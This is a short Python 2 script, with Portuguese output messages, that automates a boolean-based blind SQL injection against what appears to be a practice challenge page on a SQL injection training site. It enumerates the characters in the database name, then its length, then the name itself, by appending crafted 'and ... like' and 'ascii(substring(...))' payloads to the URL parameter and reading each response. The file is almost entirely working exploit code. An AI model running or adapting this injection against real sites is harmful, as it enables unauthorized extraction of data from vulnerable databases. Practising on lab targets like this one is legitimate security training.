#!/usr/bin/env python2.7
# _*_ coding: utf-8 _*_
import requests as req
import re

# url vars
alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '$', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
global url, inj, comment, regex, neg
url=("http://www.leettime.net/sqlninja.com/tasks/blind_ch1.php?id=1")
inj=("'")
comment=(" or 'false")
regex=("<center>(.*)</center>")
neg = ("not")

# function to mount the db wordlist
def db_wordlist():
    lista=[]
    cont=0

    while (cont < 38):
        try:
            link = str(url+inj+" and (select 1 from dual where database() like '%"+alpha[cont]+"%')"+comment)
        
            r = req.get(link)
            result = re.search(regex, r.text)

            if (neg not in result.group(0)):
                if alpha[cont].isalpha():
                    lista.append(alpha[cont])
                    lista.append(alpha[cont].upper())
                    print ("Letra %s existe" %(alpha[cont]))

                else:
                    lista.append(alpha[cont])
                    print ("Num  %s n existe" %(alpha[cont]))



            else:
                 print ("Letra/numero %s n existe" %(alpha[cont]))
            
            cont+=1

        except req.exceptions.ConnectionError:
            print ("[!] ConectionError!")
            pass

    return lista

def len_db():
    #min_db_temp = len(set([x.upper() for x in db_wordlist()])) # counting min db len
    min_db_temp = 14

    while (True):
        try:
            link = str(url+inj+" and length((select database())) like "+str(min_db_temp)+comment)

            r = req.get(link)
            result = re.search(regex, r.text)

            if (neg not in result.group(0)):
                print ("[+] O tamanho da DB é %i." %(min_db_temp))
                break

            min_db_temp+=1

        except req.exceptions.ConnectionError:
            print ("[!] ConectionError!")
            pass

def db_name():
    list_ = ['e', 'E', 'h', 'H', 'i', 'I', 'l', 'L', 'm', 'M', 'o', 'O', 't', 'T', 'w', 'W', '_', '1', '6', '7']
    cont = 1 # letter position
    i_list = 1 # letter index
    nome = ("")

    while (cont < 17+1):
        try:
            link = str(url+inj+" and ascii(substring((select database() limit 0,1),"+str(cont)+",1)) like "+str(ord(list_[i_list]))+comment)

            r = req.get(link)
            result = re.search(regex, r.text)

            if (neg not in result.group(0)):
                nome = nome+list_[i_list]
                print nome
                cont+=1
                i_list=0

            else:
                i_list+=1

        except req.exceptions.ConnectionError:
            print ("[!] ConnectionError!")
            pass


print db_wordlist()
